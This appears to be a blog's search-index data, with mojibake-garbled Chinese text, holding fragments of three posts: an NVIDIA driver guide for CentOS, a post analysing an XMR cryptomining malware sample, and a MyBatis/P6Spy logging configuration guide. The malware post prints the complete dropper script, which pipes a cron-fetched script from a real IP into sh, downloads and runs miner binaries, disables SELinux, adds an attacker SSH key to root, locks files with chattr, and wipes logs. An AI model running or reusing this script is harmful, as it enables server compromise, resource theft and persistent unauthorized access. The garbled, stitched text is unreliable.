¸å¹¶é‡å¯åï¼Œæ˜¾ç¤ºå™¨æ— æ³•æ˜¾ç¤º GNOME æ¡Œé¢ç¯å¢ƒï¼ˆä¸€èˆ¬æ˜¯å› ä¸ºæ˜¾å¡é©±åŠ¨ä¸¢å¤±å¯¼è‡´æ˜¾ç¤ºå™¨æ— æ³•æ˜¾ç¤ºæ¡Œé¢ç¯å¢ƒï¼Œä½†å¤§å¤šæ•°æƒ…å†µä¸‹ Centos ç³»ç»Ÿå·²ç»å¯åŠ¨æˆåŠŸï¼‰ï¼Œæ­¤æ—¶å¯ä»¥åœ¨å¦ä¸€å°æœºå™¨ä¸Šé€šè¿‡ SSH è¿œç¨‹ç™»å½•è¿›æ—§çš„ Centos ç³»ç»Ÿï¼Œç„¶åæŒ‰ç…§ä¸Šé¢çš„æ­¥éª¤é‡æ–°å®‰è£… NVIDIA çš„æ˜¾å¡é©±åŠ¨ï¼ˆå¦‚æœå®‰è£…ç¨‹åºæç¤ºæ˜¾å¡é©±åŠ¨å·²å­˜åœ¨ï¼Œæ‰‹åŠ¨å¸è½½æ˜¾å¡é©±åŠ¨åï¼Œå†é‡æ–°å®‰è£…å³å¯ï¼‰ã€‚ ä¸»æ¿å¯ç”¨ç‹¬ç«‹æ˜¾å¡ ä¸€èˆ¬çš„æ¡Œé¢ä¸»æ¿ï¼ˆå®¶ç”¨ï¼‰å¯ä»¥è‡ªåŠ¨æ£€æµ‹åˆ°ç‹¬ç«‹æ˜¾å¡å¹¶å¯ç”¨ï¼Œä½†æ˜¯éƒ¨åˆ†ä¸»æ¿ï¼ˆä¾‹å¦‚æœåŠ¡å™¨ä¸»æ¿ï¼‰ï¼Œåˆ™éœ€è¦åœ¨ BIOS é‡Œå°†æ¿è½½æ˜¾å¡æˆ–è€… CPU çš„æ ¸æ˜¾å±è”½æ‰ï¼Œä¸ªåˆ«å“ç‰Œå¯èƒ½éœ€è¦é€šè¿‡ä¸»æ¿è·³çº¿çš„æ–¹å¼å±è”½æ¿è½½æ˜¾å¡æˆ–è€… CPU çš„æ ¸æ˜¾ã€‚è¶…å¾®çš„æœåŠ¡å™¨ä¸»æ¿ä¸€èˆ¬éœ€è¦åœ¨ BIOS é‡Œè®¾ç½®æ¿è½½æ˜¾å¡çš„å±è”½ï¼Œå¦åˆ™ç‹¬ç«‹æ˜¾å¡æ— æ³•æ­£å¸¸è¯†åˆ«ã€‚å¯ç”¨ç‹¬ç«‹æ˜¾å¡ä¹‹åï¼Œè¶…å¾®çš„éƒ¨åˆ†æœåŠ¡å™¨ä¸»æ¿åœ¨ç³»ç»Ÿåˆšå¯åŠ¨çš„æ—¶å€™ï¼Œæ˜¾ç¤ºå™¨ä¸ä¼šæ˜¾ç¤ºä»»ä½•å†…å®¹ï¼ˆé»‘å± + æ— ä¿¡å·è¾“å‡ºï¼‰ï¼›å› ä¸ºæœåŠ¡å™¨ä¸»æ¿å¼€æœºè‡ªæ£€çš„è€—æ—¶è¾ƒé•¿ï¼Œæ­¤æ—¶ä¸€èˆ¬éœ€è¦è€å¿ƒç­‰å¾…å‡ åç§’ç”šè‡³æ›´ä¹…ï¼Œæ˜¾ç¤ºå™¨æ‰ä¼šæ˜¾ç¤ºç¡¬ä»¶è‡ªæ£€å’Œç³»ç»Ÿå¯åŠ¨ç›¸å…³çš„ä¿¡æ¯ã€‚ è¡¥å……è¯´æ˜ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œåªè¦ Centos ç³»ç»Ÿå¯ä»¥æ­£å¸¸è¯†åˆ«åˆ° NVIDIA çš„æ˜¾å¡ï¼ŒåŒæ—¶æ˜¾ç¤ºå™¨ä¸ NVIDIA çš„æ˜¾å¡æ­£ç¡®è¿æ¥ä¸Šï¼›é‚£ä¹ˆå³ä½¿ä¸å®‰è£… NVIDIA çš„æ˜¾å¡é©±åŠ¨ç¨‹åºï¼Œåœ¨ç³»ç»Ÿå¯åŠ¨çš„æ—¶å€™ï¼Œæ˜¾ç¤ºå™¨éƒ½å¯ä»¥æ­£å¸¸æ˜¾ç¤ºç¡¬ä»¶è‡ªæ£€å’Œç³»ç»Ÿå¯åŠ¨ç›¸å…³çš„ä¿¡æ¯ï¼ˆå¯èƒ½ä¼šå»¶æ—¶æ˜¾ç¤ºï¼‰ï¼›å”¯ä¸€çš„é—®é¢˜æ˜¯åœ¨ç³»ç»Ÿæ­£å¸¸å¯åŠ¨å®Œæˆåï¼Œæ˜¾ç¤ºå™¨æ²¡åŠæ³•æ˜¾ç¤º GNOME æ¡Œé¢ç¯å¢ƒã€‚ nvidia-smi å‘½ä»¤è¾“å‡ºçš„ä¿¡æ¯ å‚è€ƒèµ„æ–™ å…³äº Centos å®‰è£…æ˜¾å¡é©±åŠ¨ Centos7.0 å®‰è£… NVIDIA é©±åŠ¨ Centos7.3 å®‰è£… NVIDIA-1080TI é©±åŠ¨ã€cudaã€cudnnã€TensorFlow var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"XMR æ¶æ„æŒ–çŸ¿è„šæœ¬åˆ†æ",url:"/posts/8f0349b3.html",text:'XMR æ¶æ„æŒ–çŸ¿è„šæœ¬æ ·æœ¬æºç ä¸€ è®°å½•äº 2019-07-26ï¼Œæ”»å‡»è€…å°†æŒ–çŸ¿è„šæœ¬çš„ä¸‹è½½ä¸æ‰§è¡Œå‘½ä»¤å†™å…¥åˆ° Redis æœåŠ¡å™¨ä¸­ï¼Œå…·ä½“å†…å®¹å¦‚ä¸‹ï¼š 1"*/1 * * * * curl -fsSL http://185.18.105.23/E5DB0E07C3D7BE80V520/init.sh |sh" 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461#!/bin/shsetenforce 0 2&gt;dev/nullecho SELINUX=disabled &gt; /etc/sysconfig/selinux 2&gt;/dev/nullsync &amp;&amp; echo 3 &gt;/proc/sys/vm/drop_cachescrondir=\'/var/spool/cron/\'"$USER"cont=`cat ${crondir}`ssht=`cat /root/.ssh/authorized_keys`echo 1 &gt; /etc/sysupdatesrtdir="/etc/sysupdates"bbdir="/usr/bin/curl"bbdira="/usr/bin/cur"ccdir="/usr/bin/wget"ccdira="/usr/bin/wge"mv /usr/bin/wget /usr/bin/getmv /usr/bin/xget /usr/bin/getmv /usr/bin/get /usr/bin/wgemv /usr/bin/curl /usr/bin/urlmv /usr/bin/xurl /usr/bin/urlmv /usr/bin/url /usr/bin/curminer_url="https://de.gsearch.com.de/api/sysupdate"miner_url_backup="http://185.18.105.23/E5DB0E07C3D7BE80V520/sysupdate"miner_size="854364"sh_url="https://de.gsearch.com.de/api/update.sh"sh_url_backup="http://185.18.105.23/E5DB0E07C3D7BE80V520/update.sh"config_url="https://de.gsearch.com.de/api/config.json"config_url_backup="http://185.18.105.23/E5DB0E07C3D7BE80V520/config.json"config_size="4954"scan_url="https://de.gsearch.com.de/api/networkservice"scan_url_backup="http://185.18.105.23/E5DB0E07C3D7BE80V520/networkservice"scan_size="2584072"watchdog_url="https://de.gsearch.com.de/api/sysguard"watchdog_url_backup="http://185.18.105.23/E5DB0E07C3D7BE80V520/sysguard"watchdog_size="1929480"kill_miner_proc(){ ps auxf|grep -v grep|grep "mine.moneropool.com"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "pool.t00ls.ru"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "zhuabcn@yahoo.com"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "monerohash.com"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "xmrpool.eu" | awk \'{print $2}\'|xargs kill -9 ps auxf|grep xiaoyao| awk \'{print $2}\'|xargs kill -9 ps auxf|grep xiaoxue| awk \'{print $2}\'|xargs kill -9 ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\\-c"|xargs kill -9 ps ax|grep -o \'./[0-9]* -c\'| xargs pkill -f pkill -f biosetjenkins pkill -f Loopback pkill -f apaceha pkill -f cryptonight pkill -f stratum pkill -f mixnerdx pkill -f performedl pkill -f JnKihGjn pkill -f irqba2anc1 pkill -f irqba5xnc1 pkill -f irqbnc1 pkill -f ir29xc1 pkill -f conns pkill -f irqbalance pkill -f crypto-pool pkill -f minexmr pkill -f XJnRj pkill -f mgwsl pkill -f pythno pkill -f jweri pkill -f lx26 pkill -f NXLAi pkill -f BI5zj pkill -f askdljlqw pkill -f minerd pkill -f minergate pkill -f Guard.sh pkill -f ysaydh pkill -f bonns pkill -f donns pkill -f kxjd pkill -f Duck.sh pkill -f bonn.sh pkill -f conn.sh pkill -f kworker34 pkill -f kw.sh pkill -f pro.sh pkill -f polkitd pkill -f acpid pkill -f icb5o pkill -f nopxi pkill -f irqbalanc1 pkill -f minerd pkill -f i586 pkill -f gddr pkill -f mstxmr pkill -f ddg.2011 pkill -f wnTKYg pkill -f deamon pkill -f disk_genius pkill -f sourplum pkill -f polkitd pkill -f nanoWatch pkill -f zigw pkill -f devtool pkill -f systemctI pkill -f WmiPrwSe pkill -f sysguard pkill -f sysupdate pkill -f networkservice crontab -r rm -rf /var/spool/cron/*}downloads(){ if [ -f "/usr/bin/curl" ] then echo $1,$2 http_code=`curl -I -m 10 -o /dev/null -s -w %{http_code} $1` if [ "$http_code" -eq "200" ] then curl --connect-timeout 10 --retry 100 $1 &gt; $2 elif [ "$http_code" -eq "405" ] then curl --connect-timeout 10 --retry 100 $1 &gt; $2 else curl --connect-timeout 10 --retry 100 $3 &gt; $2 fi elif [ -f "/usr/bin/cur" ] then http_code = `cur -I -m 10 -o /dev/null -s -w %{http_code} $1` if [ "$http_code" -eq "200" ] then cur --connect-timeout 10 --retry 100 $1 &gt; $2 elif [ "$http_code" -eq "405" ] then cur --connect-timeout 10 --retry 100 $1 &gt; $2 else cur --connect-timeout 10 --retry 100 $3 &gt; $2 fi elif [ -f "/usr/bin/wget" ] then wget --timeout=10 --tries=100 -O $2 $1 if [ $? -ne 0 ] then wget --timeout=10 --tries=100 -O $2 $3 fi elif [ -f "/usr/bin/wge" ] then wge --timeout=10 --tries=100 -O $2 $1 if [ $? -eq 0 ] then wge --timeout=10 --tries=100 -O $2 $3 fi fi}kill_sus_proc(){ ps axf -o "pid"|while read procid do ls -l /proc/$procid/exe | grep /tmp if [ $? -ne 1 ] then cat /proc/$procid/cmdline| grep -a -E "sysguard|update.sh|sysupdate|networkservice" if [ $? -ne 0 ] then kill -9 $procid else echo "don\'t kill" fi fi done ps axf -o "pid %cpu" | awk \'{if($2&gt;=40.0) print $1}\' | while read procid do cat /proc/$procid/cmdline| grep -a -E "sysguard|update.sh|sysupdate|networkservice" if [ $? -ne 0 ] then kill -9 $procid else echo "don\'t kill" fi done}kill_miner_prockill_sus_procif [ -f "$rtdir" ]then echo "i am root" echo "goto 1" &gt;&gt; /etc/sysupdate chattr -i /etc/sysupdate* chattr -i /etc/config.json* chattr -i /etc/update.sh* chattr -i /root/.ssh/authorized_keys* chattr -i /etc/networkservice if [ ! -f "/usr/bin/crontab" ] then echo "*/30 * * * * sh /etc/update.sh &gt;/dev/null 2&gt;&amp;1" &gt;&gt; ${crondir} else [[ $cont =~ "update.sh" ]] || (crontab -l ; echo "*/30 * * * * sh /etc/update.sh &gt;/dev/null 2&gt;&amp;1") | crontab - fi chmod 700 /root/.ssh/ echo &gt;&gt; /root/.ssh/authorized_keys chmod 600 root/.ssh/authorized_keys echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9WKiJ7yQ6HcafmwzDMv1RKxPdJI/oeXUWDNW1MrWiQNvKeSeSSdZ6NaYVqfSJgXUSgiQbktTo8Fhv43R9FWDvVhSrwPoFBz9SAfgO06jc0M2kGVNS9J2sLJdUB9u1KxY5IOzqG4QTgZ6LP2UUWLG7TGMpkbK7z6G8HAZx7u3l5+Vc82dKtI0zb/ohYSBb7pK/2QFeVa22L+4IDrEXmlv3mOvyH5DwCh3HcHjtDPrAhFqGVyFZBsRZbQVlrPmwqXH2bOLc1PMrK1oG8dyk8gY8m4iZfr9ZDGxs4gAqdWtBQNIN8cvz4SI+Jv9fvayMH7f+Kl2yXiHN5oD9BVTkdIWX root@u17" &gt;&gt; /root/.ssh/authorized_keys cfg="/etc/config.json" file="/etc/sysupdate" if [-f "/etc/config.json" ] then filesize_config=`ls -l /etc/config.json | awk \'{ print $5 }\'` if [ "$filesize_config" -ne "$config_size" ] then pkill -f sysupdate rm /etc/config.json downloads $config_url /etc/config.json $config_url_backup else echo "no need download" fi else downloads $config_url /etc/config.json $config_url_backup fi if [ -f "/etc/sysupdate" ] then filesize1=`ls -l /etc/sysupdate | awk \'{ print $5 }\'` if [ "$filesize1" -ne "$miner_size" ] then pkill -f sysupdate rm /etc/sysupdate downloads $miner_url /etc/sysupdate $miner_url_backup else echo "not need download" fi else downloads $miner_url /etc/sysupdate $miner_url_backup fi if [ -f "/etc/sysguard" ] then filesize1=`ls -l /etc/sysguard | awk \'{ print $5 }\'` if [ "$filesize1" -ne "$watchdog_size" ] then pkill -f sysguard rm /etc/sysguard downloads $watchdog_url /etc/sysguard $watchdog_url_backup else echo "not need download" fi else downloads $watchdog_url /etc/sysguard $watchdog_url_backup fi downloads $sh_url /etc/update.sh $sh_url_backup if [ -f "/etc/networkservice" ] then filesize2=`ls -l /etc/networkservice | awk \'{ print $5 }\'` if [ "$filesize2" -ne "$scan_size" ] then pkill -f networkservice rm /etc/networkservice downloads $scan_url /etc/networkservice $scan_url_backup else echo "not need download" fi else downloads $scan_url /etc/networkservice $scan_url_backup fi chmod 777 /etc/sysupdate ps -fe|grep sysupdate |grep -v grep if [ $? -ne 0 ] then cd /etc echo "not root runing" sleep 5s ./sysupdate &amp; else echo "root runing....." fi chmod 777 /etc/networkservice ps -fe|grep networkservice |grep -v grep if [ $? -ne 0 ] then cd /etc echo "not roots runing" sleep 5s ./networkservice &amp; else echo "roots runing....." fi chmod 777 /etc/sysguard ps -fe|grep sysguard |grep -v grep if [ $? -ne 0 ] then echo "not tmps runing" cd /etc chmod 777 sysguard sleep 5s ./sysguard &amp; else echo "roots runing....." fi chmod 777 /etc/sysupdate chattr +i /etc/sysupdate chmod 777 /etc/networkservice chattr +i /etc/networkservice chmod 777 /etc/config.json chattr +i /etc/config.json chmod 777 /etc/update.sh chattr +i /etc/update.sh chmod 777 /root/.ssh/authorized_keys chattr +i /root/.ssh/authorized_keyselse echo "goto 1" &gt; /tmp/sysupdates chattr -i /tmp/sysupdate* chattr -i /tmp/networkservice chattr -i /tmp/config.json* chattr -i /tmp/update.sh* if [ ! -f "/usr/bin/crontab" ] then echo "*/30 * * * * sh /tmp/update.sh &gt;/dev/null 2&gt;&amp;1" &gt;&gt; ${crondir} else [[ $cont =~ "update.sh" ]] || (crontab -l ; echo "*/30 * * * * sh /tmp/update.sh &gt;/dev/null 2&gt;&amp;1") | crontab - fi if [ -f "/tmp/config.json" ] then filesize1=`ls -l /tmp/config.json | awk \'{ print $5 }\'` if [ "$filesize1" -ne "$config_size" ] then pkill -f sysupdate rm /tmp/config.json downloads $config_url /tmp/config.json $config_url_backup else echo "no need download" fi else downloads $config_url /tmp/config.json $config_url_backup fi if [ -f "/tmp/sysupdate" ] then filesize1=`ls -l /tmp/sysupdate | awk \'{ print $5 }\'` if [ "$filesize1" -ne "$miner_size" ] then pkill -f sysupdate rm /tmp/sysupdate downloads $miner_url /tmp/sysupdate $miner_url_backup else echo "no need download" fi else downloads $miner_url /tmp/sysupdate $miner_url_backup fi if [ -f "/tmp/sysguard" ] then filesize1=`ls -l /tmp/sysguard | awk \'{ print $5 }\'` if [ "$filesize1" -ne "$watchdog_size" ] then pkill -f sysguard rm /tmp/sysguard downloads $watchdog_url /tmp/sysguard $watchdog_url_backup else echo "not need download" fi else downloads $watchdog_url /tmp/sysguard $watchdog_url_backup fi echo "i am here" downloads $sh_url /tmp/update.sh $sh_url_backup if [ -f "/tmp/networkservice" ] then filesize2=`ls -l /tmp/networkservice | awk \'{ print $5 }\'` if [ "$filesize2" -ne "$scan_size" ] then pkill -f networkservice rm /tmp/networkservice downloads $scan_url /tmp/networkservice $scan_url_backup else echo "no need download" fi else downloads $scan_url /tmp/networkservice $scan_url_backup fi ps -fe|grep sysupdate |grep -v grep if [ $? -ne 0 ] then echo "not tmp runing" cd /tmp chmod 777 sysupdate sleep 5s ./sysupdate &amp; else echo "tmp runing....." fi ps -fe|grep networkservice |grep -v grep if [ $? -ne 0 ] then echo "not tmps runing" cd /tmp chmod 777 networkservice sleep 5s ./networkservice &amp; else echo "tmps runing....." fi ps -fe|grep sysguard |grep -v grep if [ $? -ne 0 ] then echo "not tmps runing" cd /tmp chmod 777 sysguard sleep 5s ./sysguard &amp; else echo "tmps runing....." fi chmod 777 /tmp/sysupdate chattr +i /tmp/sysupdate chmod 777 /tmp/networkservice chattr +i /tmp/networkservice chmod 777 /tmp/sysguard chattr +i /tmp/sysguard chmod 777 /tmp/update.sh chattr +i /tmp/update.sh chmod 777 /tmp/config.json chattr +i /tmp/config.jsonfiiptables -Fiptables -Xiptables -A OUTPUT -p tcp --dport 3333 -j DROPiptables -A OUTPUT -p tcp --dport 5555 -j DROPiptables -A OUTPUT -p tcp --dport 7777 -j DROPiptables -A OUTPUT -p tcp --dport 9999 -j DROPiptables -I INPUT -s 43.245.222.57 -j DROPservice iptables reloadps auxf|grep -v grep|grep "stratum"|awk \'{print $2}\'|xargs kill -9history -cecho &gt; /var/spool/mail/rootecho &gt; /var/log/wtmpecho &gt; /var/log/secureecho &gt; /root/.bash_history var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ç½‘ç»œå®‰å…¨ linuxç³»ç»Ÿç¼–ç¨‹"},{title:"MyBatis æ—¥å¿—ä¿¡æ¯æ‰“å°",url:"/posts/2050e9a3.html",text:'Logback æ‰“å° MyBatis çš„ SQL ä»¥ä¸‹é…ç½®åªä¼šç›´æ¥æ‰“å° MyBatis çš„ SQLï¼Œä¸ä¼šè‡ªåŠ¨æ›¿æ¢ SQL ä¸­çš„ â€œ?â€ ä¸ºçœŸå®å‚æ•°å€¼ï¼Œå¦‚æœéœ€è¦æ‰“å°å®Œæ•´çš„ SQLï¼Œè¯·å‚è€ƒä¸‹é¢ä»‹ç»çš„ P6Spy é…ç½®æ•™ç¨‹ã€‚æ›´å¤šçš„ Logback é…ç½®å†…å®¹ï¼Œå¯å‚è€ƒ SpringBoot2.0 æ•´åˆ Logbackã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;configuration scan="true" scanPeriod="60 seconds" debug="false"&gt; &lt;!-- æ—¥å¿—çº§åˆ«ä»ä½åˆ°é«˜ï¼štrace &lt; debug &lt; info &lt; warn &lt; error &lt; fatal --&gt; &lt;!-- æ—¥å¿—ä¸Šä¸‹æ–‡åç§°--&gt; &lt;contextName&gt;logback&lt;/contextName&gt; &lt;!-- å…¨å±€çš„æ—¥å¿—çº§åˆ«ï¼Œä¸‹é¢çš„æ‰€æœ‰é…ç½®åªè®°å½•å¤§äºæˆ–ç­‰äºæ­¤çº§åˆ«çš„æ—¥å¿—ä¿¡æ¯ï¼ˆé™¤äº†MyBatisï¼‰ --&gt; &lt;property name="log.level" value="info"/&gt; &lt;!-- æ—¥å¿—æ–‡ä»¶çš„ç›®å½•è·¯å¾„--&gt; &lt;property name="log.path" value="/var/log/spring-cloud"/&gt; &lt;!--è¾“å‡ºåˆ°æ§åˆ¶å°--&gt; &lt;appender name="console" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;!--æ­¤æ—¥å¿—Filteråœ¨å¼€å‘ç¯å¢ƒæ‰å¯ç”¨ï¼Œåªé…ç½®æœ€ä½çº§åˆ«ï¼Œæ§åˆ¶å°è¾“å‡ºçš„æ—¥å¿—çº§åˆ«æ˜¯å¤§äºæˆ–ç­‰äºæ­¤çº§åˆ«çš„æ—¥å¿—ä¿¡æ¯ --&gt; &lt;filter class="ch.qos.logback.classic.filter.ThresholdFilter"&gt; &lt;level&gt;${log.level}&lt;/level&gt; &lt;/filter&gt; &lt;!-- æ—¥å¿—è¾“å‡ºæ ¼å¼ --&gt; &lt;encoder&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} %contextName [%thread] %-5level %logger{36}.%M\\(%line\\) - %msg%n &lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!--è¾“å‡ºåˆ°æ–‡ä»¶--&gt; &lt;appender name="file" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- æ­£åœ¨è®°å½•çš„æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„ --&gt; &lt;file&gt;${log.path}/${log.level}.log&lt;/file&gt; &lt;!-- æ—¥å¿—è¾“å‡ºæ ¼å¼ --&gt; &lt;encoder&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} %contextName [%thread] %-5level %logger{36}.%M\\(%line\\) - %msg%n &lt;/pattern&gt; &lt;/encoder&gt; &lt;!-- æ§åˆ¶æ—¥å¿—æ–‡ä»¶åªè®°å½•å¤§äºæˆ–ç­‰äºæ­¤çº§åˆ«çš„æ—¥å¿—ä¿¡æ¯ --&gt; &lt;filter class="ch.qos.logback.classic.filter.ThresholdFilter"&gt; &lt;level&gt;${log.level}&lt;/level&gt; &lt;/filter&gt; &lt;!-- æ—¥å¿—æ»šåŠ¨ç­–ç•¥ --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!--æ—¥å¿—æ–‡ä»¶ä¿ç•™å¤©æ•°--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;!-- æ—¥å¿—å½’æ¡£ --&gt; &lt;fileNamePattern&gt;${log.path}/${log.level}/${log.level}-%d{yyyy-MM-dd}.%i.log.gz&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;100MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;/rollingPolicy&gt; &lt;/appender&gt; &lt;!-- æŒ‡å®šæœ€åŸºç¡€çš„æ—¥å¿—è¾“å‡ºçº§åˆ« --&gt; &lt;root level="${log.level}"&gt; &lt;appender-ref ref="console"/&gt; &lt;appender-ref ref="file"/&gt; &lt;/root&gt; &lt;!--å°†MyBatisçš„æ—¥å¿—ä¿¡æ¯è¾“å‡ºåˆ°æ§åˆ¶å°--&gt; &lt;appender name="mybatis_console" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;filter class="ch.qos.logback.classic.filter.ThresholdFilter"&gt; &lt;level&gt;debug&lt;/level&gt; &lt;/filter&gt; &lt;!-- æ—¥å¿—è¾“å‡ºæ ¼å¼ --&gt; &lt;encoder&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} %contextName [%thread] %-5level %logger{36}.%M\\(%line\\) - %msg%n &lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!-- æ‰“å°MyBatisçš„æ—¥å¿—ä¿¡æ¯ï¼Œå¼€å‘ç¯å¢ƒæ‰å¯ç”¨ --&gt; &lt;logger name="com.springcloud.demo.dao" level="debug" additivity="false"&gt; &lt;appender-ref ref="mybatis_console"/&gt; &lt;/logger&gt;&lt;/configuration&gt; P6Spy æ‰“å° MyBatis çš„ SQL ä»¥ä¸‹å…§å®¹æ˜¯åœ¨ SpringBoot2.0 çš„ application.yml æ–‡ä»¶ä¸­é…ç½®ï¼Œä¸»è¦çš„é…ç½®å†…å®¹æ˜¯æŒ‡å®š driver-class-nameã€jdbc-urlï¼Œç„¶ååœ¨ classpathï¼ˆsrc/main/resourcesï¼‰ç›®å½•ä¸‹æ·»åŠ  spy.properties é…ç½®æ–‡ä»¶ã€‚ 123456789101112131415161718192021spring: datasource: username: root password: 123456 driver-class-name: com.p6spy.engine.spy.P6SpyDriver type: com.alibaba.druid.pool.DruidDataSource filters: stat initialSize: 100 maxActive: 1000 maxOpenPreparedStatements: 20 maxWait: 60000 minEvictableIdleTimeMillis: 300000 minIdle: 500 poolPreparedStatements: true testOnBorrow: false testOnReturn: false testWhileIdle: true validationQuery: select \'x\' timeBetweenEvictionRunsMillis: 60000 url: jdbc:p6spy:mysql://127.0.0.1:3306/spring_cloud?useUnicode=true&amp;characterEncoding=utf-8&amp;allowMultiQueries=true&amp;useSSL=false&amp;serverTimezone=Asia/Shanghai åœ¨ spy.properties é…ç½®æ–‡ä»¶é‡Œï¼Œä¸»è¦é…ç½®å†…å®¹ä¸ºæ•°æ®åº“é©±åŠ¨ã€æ—¥æœŸæ ¼å¼åŒ–ã€å•è¡Œæˆ–å¤šè¡Œæ‰“å°ï¼Œæ—¥å¿—è¾“å‡ºæ–¹å¼ï¼ˆæ§åˆ¶å°ã€æ–‡ä»¶ç­‰ï¼‰ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246################################################################## P6Spy Options File ## See documentation for detailed instructions ## http://p6spy.github.io/p6spy/2.0/configandusage.html #################################################################################################################################### MODULES ## ## Module list adapts the modular functionality of P6Spy. ## Only modules listed are active. ## (default is com.p6spy.engine.logging.P6LogFactory and ## com.p6spy.engine.spy.P6SpyFactory) ## Please note that the core module (P6SpyFactory) can\'t be ## deactivated. ## Unlike the other properties, activation of the changes on ## this one requires reload. ###################################################################modulelist=com.p6spy.engine.spy.P6SpyFactory,com.p6spy.engine.logging.P6LogFactory,com.p6spy.engine.outage.P6OutageFactory################################################################# CORE (P6SPY) PROPERTIES ################################################################## A comma separated list of JDBC drivers to load and register.# (default is empty)## Note: This is normally only needed when using P6Spy in an# application server environment with a JNDI data source or when# using a JDBC driver that does not implement the JDBC 4.0 API# (specifically automatic registration).driverlist=com.mysql.jdbc.Driver# for flushing per statement# (default is false)#autoflush = false# sets the date format using Java\'s SimpleDateFormat routine.# In case property is not set, milliseconds since 1.1.1970 (unix time) is used (default is empty)dateformat=yyyy-MM-dd HH:mm:ss.SSS# prints a stack trace for every statement logged#stacktrace=false# if stacktrace=true, specifies the stack trace to print#stacktraceclass=# determines if property file should be reloaded# Please note: reload means forgetting all the previously set# settings (even those set during runtime - via JMX)# and starting with the clean table# (default is false)#reloadproperties=false# determines how often should be reloaded in seconds# (default is 60)#reloadpropertiesinterval=60# 